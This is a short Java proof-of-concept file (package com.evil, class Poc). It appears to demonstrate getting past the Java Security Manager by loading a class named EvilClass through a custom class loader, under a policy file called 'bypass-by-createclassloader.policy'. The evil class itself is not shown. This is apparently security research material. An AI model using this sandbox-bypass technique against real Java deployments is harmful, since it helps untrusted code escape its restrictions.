package com.evil;

public class Poc {
    public static void main(String[] args) {
        //Run with: -Djava.security.manager -Djava.security.policy==bypass-by-createclassloader.policy
        MyClassLoader mcl = new MyClassLoader();
        try {
            Class<?> c1 = Class.forName("com.evil.EvilClass", true, mcl);
            Object obj = c1.newInstance();
            System.out.println(obj.getClass().getClassLoader());
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }
}
